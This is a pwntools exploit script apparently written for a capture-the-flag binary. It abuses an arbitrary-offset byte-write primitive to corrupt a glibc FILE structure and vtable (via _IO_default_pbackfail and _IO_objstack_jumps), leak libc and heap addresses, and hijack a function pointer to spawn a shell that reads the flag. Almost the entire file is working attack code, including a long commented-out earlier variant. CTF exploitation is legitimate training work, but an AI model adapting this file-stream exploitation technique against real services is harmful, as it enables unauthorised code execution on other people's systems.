#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF('chall')
#pwn.context.terminal = ["tilix", "-t", "CTFMate", "-a", "session-add-right", "-e"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
# pwn.context.timeout = 1000

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
source /home/nasm/Downloads/pwndbg/gdbinit.py
'''.format(**locals())

io = None
io = start()

def fflush():
    io.sendlineafter(b"> ", b"1")

def trick(offt, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"offset: ", str(offt).encode())
    io.sendlineafter(b"value: ", data)

def leave():
    io.sendlineafter(b"> ", b"0")

def write_ptr(ptr: bytes, offt: int, debug=True):
    for i in range(8):
        # if debug:
        #     print(f"writing {str(ptr[i]).encode()} @ {offt + i}")

        #time.sleep(0.5)
        if ptr[i]:
            trick(offt + i, str(ptr[i]).encode())

def partial_write2(ptr: bytes, offt: int):
    for i in range(2):
        trick(offt + i, str(ptr[i]).encode())

def partial_write(ptr: bytes, offt: int):
    for i in range(1):
        trick(offt + i, str(ptr[i]).encode())

def leak_ptr(ptr: bytes) -> int:
    #write_ptr(pwn.p64(0xfbad1800 | 0x8000), 0)

    #write_ptr(ptr, 8)
    write_ptr(ptr, 16)
    #write_ptr(ptr, 24)
    write_ptr(ptr, 32)
    
    dest = (int.from_bytes(ptr, byteorder="little")+8).to_bytes(8, byteorder='little')

    write_ptr(dest, 32 + 8)
    write_ptr(dest, 32 + 16)
    #write_ptr(dest, 32 + 24)
    #write_ptr(dest, 32 + 32)

    fflush()
    ret = None

    try:
        ret = pwn.u64(io.recv(8).ljust(8, b"\x00"))
    except:
        print("no way")

    return ret

# if pwn.args.LOCAL and not pwn.args.TEST_LOCAL:
#     """
#     pwndbg> p &_IO_file_jumps_mmap
#     $1 = (const struct _IO_jump_t *) 0x7f9d74c69540 <_IO_file_jumps_mmap>
#     pwndbg> p &_IO_file_jumps
#     $2 = (const struct _IO_jump_t *) 0x7f9d74c69600 <_IO_file_jumps>
#     pwndbg> p/d 0x40
#     $3 = 64
#     pwndbg> p/d 0x95
#     $4 = 149
#     """

#     # do_allocate
#     trick(216, b"8")
#     fflush()


#     # trick(216, b"64")
#     # trick(217, b"213")
#     # _IO_file_jumps => _IO_file_jumps_mmap

#     # _IO_file_underflow => _IO_default_pbackfail
#     trick(216, b"192")
#     trick(217, b"213")
#     fflush()

#     """
#     int
#     _IO_default_pbackfail (FILE *fp, int c)
#     => not _IO_IN_BACKUP         0x0100
#     => _IO_read_base == _IO_write_ptr
#     => _IO_read_end == _IO_write_ptr + 8
#     => _IO_write_end = right size
#     """

#     write_ptr(pwn.p64(0xfbad1800), 0)

#     partial_write(pwn.p8(0x70), 8)
#     partial_write(pwn.p8(0x70), 16)
#     partial_write(pwn.p8(0x70), 24)
#     partial_write(pwn.p8(0x70), 32)

#     partial_write(pwn.p8(0x78), 32+8)
#     partial_write(pwn.p8(0x78), 32+16)
#     partial_write(pwn.p8(0x78), 32+24)
#     partial_write(pwn.p8(0x78), 32+32)

#     # edit vtable
#     partial_write2(pwn.p16(0xd600), 216)
#     write_ptr(pwn.p64(1), 112)
#     fflush()

#     leak = pwn.u64(io.recv(8).ljust(8, b"\x00")) - 0x2160c0
#     pwn.log.info(f"libc: {hex(leak)}")

#     # __malloc_hook = leak + 0x2204a0 - 8
#     __malloc_hook = leak + 0x2204a8 - 0x10
#     main_arena = leak + 0x219c80
#     leak_main_arena = main_arena + 96

#     heap = leak_ptr(pwn.p64(leak_main_arena)) - 0x2510
#     pwn.log.info(f"heap: {hex(heap)}")
#     fake_chunk = heap + 0x300
#     _IO_objstack_jumps = leak + 0x2163c0

#     """
#     # define obstack_1grow(OBSTACK, datum)                        \
#             __extension__                                   \
#                 ({ struct obstack *__o = (OBSTACK);                         \
#                         if (__o->next_free + 1 > __o->chunk_limit)               \
#                             _obstack_newchunk (__o, 1);                          \
#                                     obstack_1grow_fast (__o, datum);                          \
#                                         (void) 0; })
#     """

#     write_ptr(pwn.p64(_IO_objstack_jumps - 8 * 9), 216)
#     write_ptr(pwn.p64(heap + 0x2a0), 216+8)

#     write_ptr(pwn.p64(0xffffffffffffffff-1), 24)

#     write_ptr(b"/bin/sh\x00", 8) # arg

#     #write_ptr(pwn.p64(0x1337), 32)
#     write_ptr(pwn.p64(leak + 0x50d60), 56) # fn ptr
#     write_ptr(pwn.p64(heap + 0x2a0 + 8), 56+16) # arg
#     write_ptr(pwn.p64(0x1337), 56+16+8)

#     write_ptr(pwn.p64(0xfbad800 | 0x8000), 0)
#     #partial_write(pwn.p8(0x21), 256)
#     # _IO_default_pbackfail (FILE *fp, int c) stuff
#     fflush()
#     """
#     fp->_IO_read_ptr <= fp->_IO_read_base
#     => fp->_IO_read_end - fp->_IO_read_base = 8 
#     => fp->_IO_read_base = fake_chunk

#     """

#     """
#     0x5555555592f0: 0x000055555555b510      0x0000000000000021
#     0x555555559300: 0x0000000000000000      0x00007ffff7f916a0

#     => 0x21a6a0 !!!!!! (stderr)
#     """

#     # io.interactive()
#     """
#     write_ptr(pwn.p64(0xfbad1800 | 0x100), 0)

#     write_ptr(pwn.p64(fake_chunk), 8)
#     write_ptr(pwn.p64(fake_chunk + 8), 8+8)
#     write_ptr(pwn.p64(fake_chunk), 16+8)

#     partial_write2(pwn.p16(0xd5d0), 216)
#     # io.interactive()
#     fflush()

#     write_ptr(pwn.p64(__malloc_hook), 16*5 + 8 + 8)
#     write_ptr(pwn.p64(leak + 0x21a6a0), 16*5 + 8 + 8 + 8)
#     # write_ptr(pwn.p64(0x2211), 16*5 + 8 + 8 + 8)

#     # fake_chunk = heap + 0x310

#     write_ptr(pwn.p64(0x91), 16*5 + 8)

#     write_ptr(pwn.p64(0xfbad1800 | 0x100), 0)

#     write_ptr(pwn.p64(fake_chunk), 8)
#     write_ptr(pwn.p64(fake_chunk + 4), 8+8)
#     write_ptr(pwn.p64(fake_chunk), 16+8)

#     partial_write2(pwn.p16(0xd5d0), 216)
#     # io.interactive()
#     write_ptr(pwn.p64(__malloc_hook ^ ((heap + 0x300) >> 12)), 16*5 + 8 + 8)
#     fflush()



#     write_ptr(pwn.p64(0x21), 16*5 + 8)
#     write_ptr(pwn.p64(0x71), 16*5 + 8 + 32)

#     # fake_chunk += 0x10

#     write_ptr(pwn.p64(0xfbad1800 | 0x100), 0)

#     write_ptr(pwn.p64(fake_chunk), 8)
#     write_ptr(pwn.p64(fake_chunk), 8+8)
#     write_ptr(pwn.p64(fake_chunk), 16+8)

#     partial_write2(pwn.p16(0xd5d0), 216)
#     # io.interactive()
#     write_ptr(pwn.p64((leak + 0xe3afe) ^ ((heap + 0x300) >> 12)), 16*5 + 8 + 8)

#     # io.interactive()
#     fflush()
#     """

#     io.interactive()

"""
pwndbg> p &_IO_file_jumps_mmap
$1 = (const struct _IO_jump_t *) 0x7f9d74c69540 <_IO_file_jumps_mmap>
pwndbg> p &_IO_file_jumps
$2 = (const struct _IO_jump_t *) 0x7f9d74c69600 <_IO_file_jumps>
pwndbg> p/d 0x40
$3 = 64
pwndbg> p/d 0x95
$4 = 149
"""

# do_allocate
partial_write(pwn.p8(0xa8), 216)
fflush()

# trick(216, b"64")
# trick(217, b"213")
# _IO_file_jumps => _IO_file_jumps_mmap

# _IO_file_underflow => _IO_default_pbackfail
# trick(216, b"192")
# trick(217, b"213")

partial_write(pwn.p8(0x60), 216)
fflush()

"""
int
_IO_default_pbackfail (FILE *fp, int c)
=> not _IO_IN_BACKUP         0x0100
=> _IO_read_base == _IO_write_ptr
=> _IO_read_end == _IO_write_ptr + 8
=> _IO_write_end = right size
"""

write_ptr(pwn.p64(0xfbad1800), 0)

# partial_write(pwn.p8(0x70), 8)
partial_write(pwn.p8(0x70), 16)
# partial_write(pwn.p8(0x70), 24)
partial_write(pwn.p8(0x70), 32)

partial_write(pwn.p8(0x78), 32+8)
partial_write(pwn.p8(0x78), 32+16)
# partial_write(pwn.p8(0x78), 32+24)
# partial_write(pwn.p8(0x78), 32+32)

    # #write_ptr(ptr, 8)
    # write_ptr(ptr, 16)
    # #write_ptr(ptr, 24)
    # write_ptr(ptr, 32)
    
    # dest = (int.from_bytes(ptr, byteorder="little")+8).to_bytes(8, byteorder='little')

    # write_ptr(dest, 32 + 8)
    # write_ptr(dest, 32 + 16)
    # #write_ptr(dest, 32 + 24)
    # #write_ptr(dest, 32 + 32)

# edit vtable
partial_write(pwn.p8(0xa0), 216)
write_ptr(pwn.p64(1), 112)
fflush()

leak = pwn.u64(io.recv(8).ljust(8, b"\x00")) - 0x2160c0 + 0x2d160
pwn.log.info(f"libc: {hex(leak)}")

# __malloc_hook = leak + 0x2204a0 - 8
# __malloc_hook = leak + 0x2204a8 - 0x10
leak_main_arena = leak + 0x1ed5a0

heap = leak_ptr(pwn.p64(leak_main_arena)) - 0x2a0
pwn.log.info(f"heap: {hex(heap)}")
# fake_chunk = heap + 0x300
_IO_objstack_jumps = leak + 0x1E9260
pwn.log.info(f"_IO_objstack_jumps: {hex(_IO_objstack_jumps)}")

"""
# define obstack_1grow(OBSTACK, datum)                        \
        __extension__                                   \
            ({ struct obstack *__o = (OBSTACK);                         \
                    if (__o->next_free + 1 > __o->chunk_limit)               \
                        _obstack_newchunk (__o, 1);                          \
                                obstack_1grow_fast (__o, datum);                          \
                                    (void) 0; })
"""

write_ptr(pwn.p64(_IO_objstack_jumps - 8 * 9), 216)
write_ptr(pwn.p64(heap + 0x2a0), 216+8)

partial_write(pwn.p8(0xff), 24)

# write_ptr(b"/bin/sh\x00", 8) # arg

#write_ptr(pwn.p64(0x1337), 32)
write_ptr(pwn.p64(leak + 0xe3b04), 56) # fn ptr, system
# write_ptr(pwn.p64(heap + 0x2a0 + 8), 56+16) # arg
partial_write(pwn.p8(0x13), 56+16+8)

write_ptr(pwn.p64(0xfbad800 | 0x8000), 0)
#partial_write(pwn.p8(0x21), 256)
# _IO_default_pbackfail (FILE *fp, int c) stuff
fflush()
"""
fp->_IO_read_ptr <= fp->_IO_read_base
=> fp->_IO_read_end - fp->_IO_read_base = 8 
=> fp->_IO_read_base = fake_chunk

"""

"""
0x5555555592f0: 0x000055555555b510      0x0000000000000021
0x555555559300: 0x0000000000000000      0x00007ffff7f916a0

=> 0x21a6a0 !!!!!! (stderr)
"""

# io.interactive()
"""
write_ptr(pwn.p64(0xfbad1800 | 0x100), 0)

write_ptr(pwn.p64(fake_chunk), 8)
write_ptr(pwn.p64(fake_chunk + 8), 8+8)
write_ptr(pwn.p64(fake_chunk), 16+8)

partial_write2(pwn.p16(0xd5d0), 216)
# io.interactive()
fflush()

write_ptr(pwn.p64(__malloc_hook), 16*5 + 8 + 8)
write_ptr(pwn.p64(leak + 0x21a6a0), 16*5 + 8 + 8 + 8)
# write_ptr(pwn.p64(0x2211), 16*5 + 8 + 8 + 8)

# fake_chunk = heap + 0x310

write_ptr(pwn.p64(0x91), 16*5 + 8)

write_ptr(pwn.p64(0xfbad1800 | 0x100), 0)

write_ptr(pwn.p64(fake_chunk), 8)
write_ptr(pwn.p64(fake_chunk + 4), 8+8)
write_ptr(pwn.p64(fake_chunk), 16+8)

partial_write2(pwn.p16(0xd5d0), 216)
# io.interactive()
write_ptr(pwn.p64(__malloc_hook ^ ((heap + 0x300) >> 12)), 16*5 + 8 + 8)
fflush()



write_ptr(pwn.p64(0x21), 16*5 + 8)
write_ptr(pwn.p64(0x71), 16*5 + 8 + 32)

# fake_chunk += 0x10

write_ptr(pwn.p64(0xfbad1800 | 0x100), 0)

write_ptr(pwn.p64(fake_chunk), 8)
write_ptr(pwn.p64(fake_chunk), 8+8)
write_ptr(pwn.p64(fake_chunk), 16+8)

partial_write2(pwn.p16(0xd5d0), 216)
# io.interactive()
write_ptr(pwn.p64((leak + 0xe3afe) ^ ((heap + 0x300) >> 12)), 16*5 + 8 + 8)

# io.interactive()
fflush()
"""

io.sendline(b"cat flag")
io.interactive()
